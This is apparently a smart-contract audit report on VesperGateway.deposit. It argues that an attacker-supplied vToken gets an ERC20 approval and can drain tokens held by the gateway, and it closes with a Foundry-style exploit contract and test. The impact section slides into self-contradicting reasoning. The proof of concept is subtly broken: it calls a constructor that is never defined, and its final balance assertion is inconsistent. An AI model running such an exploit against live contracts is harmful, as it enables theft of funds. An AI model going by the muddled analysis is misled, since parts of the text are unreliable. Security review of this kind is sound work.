### Title
`VesperGateway.deposit` executes arbitrary attacker-supplied code and hands it an ERC20 approval, allowing theft of tokens held by the gateway — (`contracts/VesperGateway.sol`)

### Summary
`VesperGateway.deposit` takes `vToken_` directly from calldata with no allowlist check (only `pool_` must be registered). It then calls attacker-controlled code — `vToken_.token()`, `vToken_.balanceOf()`, `vToken_.deposit(amount_)` — from the gateway's context, and before the call it grants the malicious contract an `amount_` approval over whichever ERC20 `token()` returns. This mirrors the tinacms/gray-matter bug class: untrusted input is executed with the host's privileges. The `deposit` function is notably the only gateway entry point without `nonReentrant`.

### Finding Description
In `deposit()`:

```solidity
// contracts/VesperGateway.sol:44-65
IERC20 _underlying = IERC20(vToken_.token());                 // attacker-controlled return value
_underlying.safeTransferFrom(_msgSender, address(this), amount_);
_underlying.safeApprove(address(vToken_), 0);
_underlying.safeApprove(address(vToken_), amount_);           // approval to attacker contract
uint256 _balanceBefore = vToken_.balanceOf(address(this));
vToken_.deposit(amount_);                                     // arbitrary code execution, msg.sender = gateway
uint256 _vTokenAmount = vToken_.balanceOf(address(this)) - _balanceBefore;
IDepositToken _depositToken = pool_.depositTokenOf(vToken_);  // returns address(0) for fake vToken
vToken_.safeApprove(address(_depositToken), _vTokenAmount);   // approving 0x0 — harmless
_depositToken.deposit(_vTokenAmount, _msgSender);             // plain call to address(0) → silently succeeds
```

Two details make the exploit complete:

1. `vToken_.token()` is read from the attacker contract, so the gateway approves spending of a *real* valuable token (e.g., WETH, USDC) held by the gateway, not a fake token.
2. `pool_.depositTokenOf(fakeVToken)` returns `address(0)` for unregistered vTokens, and `_depositToken.deposit(...)` is a plain external call (not `SafeERC20` with a code-existence check), so a call to `address(0)` succeeds silently and the whole transaction commits. The theft inside `vToken_.deposit()` is therefore not reverted.

### Impact Explanation
Direct theft of ERC20 funds held by `VesperGateway`. The gateway inherits `TokenHolder.sweep` specifically because user tokens get stuck in it (mis-sent transfers, rounding leftovers); a malicious `vToken_.deposit()` can call `underlying.transferFrom(address(gateway), attacker, amount_)` using the fresh approval and drain up to `amount_` of any real token the contract holds. The attacker can choose `amount_` arbitrarily large (the `safeTransferFrom` only requires the *caller* to have that balance of the fake/real underlying — and if `token()` returns the fake token the pull is free while the approval on the real token is not possible... note the approval is on the token returned by `token()`, so the attacker must supply `amount_` of the real token to maximize drain; if the gateway balance `B < amount_`, attacker supplies `B` and nets `B` back plus `B` stolen = pure profit of `B`). Additionally, the unconsumed approval persists after the transaction, letting the malicious vToken pull future accruals up to `amount_` via `transferFrom` at any later time.

### Likelihood Explanation
Fully permissionless: any EOA can call `deposit(pool_, vToken_, amount_)` directly or via `Operator.execute`. No privileged role, oracle manipulation, or external protocol assumption is required — the only precondition is that the gateway holds a non-zero balance of some token, which the existence of `TokenHolder.sweep` shows is an expected state. There is no `nonReentrant` guard on `deposit` and no `doesDepositTokenExist`/`vToken` allowlist check.

### Recommendation
- Resolve the deposit token first and validate it: `IDepositToken _dt = pool_.depositTokenOf(vToken_); require(pool_.doesDepositTokenExist(_dt))` before any external call or approval.
- Reject zero-address `_depositToken` explicitly.
- Whitelist `vToken_` against the pool's registered deposit tokens (i.e., only allow `vToken_` equal to `_dt.underlying()`).
- Add `nonReentrant` to `deposit` for defense in depth.

### Proof of Concept
```solidity
// Foundry-style PoC sketch
contract EvilVToken {
    IERC20 public stolen; // set to real token, e.g. WETH held by gateway
    uint256 loot;
    function token() external view returns (address) { return address(stolen); }
    function balanceOf(address) external returns (uint256) { return 0; }
    function deposit(uint256) external {
        // msg.sender = VesperGateway, which just approved us for `loot`
        stolen.transferFrom(msg.sender, address(this), loot);
    }
    function approve(address, uint256) external pure returns (bool) { return true; }
}

function testDrainGateway() public {
    // Assume gateway holds B wei of WETH (stuck funds recoverable via sweep)
    EvilVToken evil = new EvilVToken(WETH, gatewayWethBalance);
    // Attacker funds themselves with `gatewayWethBalance` WETH (or uses flash loan)
    WETH.approve(address(vesperGateway), gatewayWethBalance);
    vesperGateway.deposit(registeredPool, IVPool(address(evil)), gatewayWethBalance);
    // succeeds: depositTokenOf(evil)==0 → deposit() on 0x0 is a no-op success
    assertEq(WETH.balanceOf(address(vesperGateway)), 0);
    assertEq(WETH.balanceOf(address(evil)), gatewayWethBalance);
}
```

Caveat noted: the monetary impact is bounded by ERC20 balances actually present in `VesperGateway` plus the lingering `amount_` approval on the reported `token()`; if deployed gateway instances hold zero stuck balances on every chain, realized theft is zero and this reduces to a latent design flaw rather than an immediately exploitable drain.
